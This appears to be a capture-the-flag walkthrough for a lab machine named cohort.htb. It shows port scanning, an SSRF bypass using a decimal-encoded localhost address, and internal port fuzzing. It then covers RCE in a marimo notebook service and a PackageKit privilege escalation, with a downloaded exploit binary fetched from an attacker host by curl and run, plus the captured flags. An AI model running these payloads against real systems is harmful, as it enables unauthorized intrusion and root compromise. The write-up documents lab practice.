# Discovery
Full TCP scan with nmap
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Possible vulnerability:
```sh
curl -ksS 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "http://2130706433/",
    "format": "json"
  }' | jq
```

## Open Ports on Machine
```sh
> ffuf \
  -u "https://cohort.htb/api/validate" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://2130706433:FUZZ/","format":"json"}' \
  -w ~/hacking/seclists/Discovery/Infrastructure/common-http-ports.txt \
  -mc all \
-fs 86 \
-o ffuf-api-validate.md \
-of md

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : https://cohort.htb/api/validate
 :: Wordlist         : FUZZ: /home/wiseman/hacking/seclists/Discovery/Infrastructure/common-http-ports.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"url":"http://2130706433:FUZZ/","format":"json"}
 :: Output file      : ffuf-api-validate.md
 :: File format      : md
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 86
________________________________________________

8888                    [Status: 200, Size: 1515, Words: 298, Lines: 1, Duration: 273ms]
80                      [Status: 200, Size: 1077, Words: 71, Lines: 1, Duration: 319ms]
443                     [Status: 200, Size: 412, Words: 35, Lines: 1, Duration: 1168ms]
5000                    [Status: 200, Size: 192, Words: 20, Lines: 1, Duration: 1179ms]
:: Progress: [36/36] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

## Interesting Finding
```sh
 ❯ curl -ksS 'https://cohort.htb/api/validate' \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "http://2130706433:80/status",
    "format": "json"
  }' | jq
{
  "ok": true,
  "fetched_status": 200,
  "content_type": "application/json",
  "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}",
  "message": "Source reachable."
}
```
JSON-Object `preview` formatted
```JSON
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {
      "name": "marketing",
      "host": "cohort.htb",
      "root": "/var/www/cohort"
    },
    {
      "name": "insights-api",
      "host": "cohort.htb",
      "path": "/api/",
      "target": "127.0.0.1:5000"
    },
    {
      "name": "notebooks",
      "host": "nb-1be3782a8afd3ad5.cohort.htb",
      "target": "127.0.0.1:8888",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

# RCE in marimo-service
Marimo Vulnerability `CVE-2026-39987`
PoC in `./marimo-ws.py`

# Found user.txt
```sh
> venv/bin/python3 marimo-ws.py
[+] WebSocket connected
[+] Interactive terminal ready
[*] Press Ctrl+] to disconnect

marimo@cohort:~$ ls
notebooks  user.txt
marimo@cohort:~$ cat user.txt
18d64fe8ec9801968fc79c2815cd9c36
```

# LPE with marimo User
Local Privilege Escalation with `CVE-2026-41651`
Downloaded Binary-Executable from `https://github.com/Vozec/CVE-2026-41651`

After Executing on Victim Machine, we have now `root` privileges
```sh
marimo@cohort:~$ curl http://10.10.14.23/cve-2026-41651 -o /tmp/cve-2026-41651
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27544  100 27544    0     0  78649      0 --:--:-- --:--:-- --:--:-- 78697
marimo@cohort:~$ chmod +x /tmp/cve-2026-41651
marimo@cohort:~$ /tmp/cve-2026-41651
═══════════════════════════════════════════════════
 CVE-2026-41651 — PackageKit TOCTOU LPE
═══════════════════════════════════════════════════
[*] Building packages (pure C)...
[+] dummy   : /tmp/.pk-dummy-106921.deb
[+] payload : /tmp/.pk-payload-106921.deb
[*] Transaction : /4_ebcbdcba
[*] Step 1 : InstallFiles(SIMULATE=0x4, dummy) [async]
[*] Step 2 : InstallFiles(NONE=0x0, payload) [async]
[*] Waiting for dispatch (30 s max)...
[!] PK error 48: Failed to obtain authentication.
[*] Finished (exit=2, 0 ms)
[*] Loop ran for 15 ms
[*] Polling for payload (120 s max)...
[*] t+1s: payload=exists dpkg_lock=free suid=not yet
[*] t+2s: payload=exists dpkg_lock=free suid=not yet

[+] SUCCESS — SUID bash at t+1700ms
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
.suid_bash: cannot set terminal process group (-1): Inappropriate ioctl for device
.suid_bash: no job control in this shell
.suid_bash-5.2# id
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

# Found root.txt
```sh
.suid_bash-5.2# cd /root/
.suid_bash-5.2# ls
root.txt
.suid_bash-5.2# cat root.txt
726fd8653ee6c3dc9323396f7e0a6119
```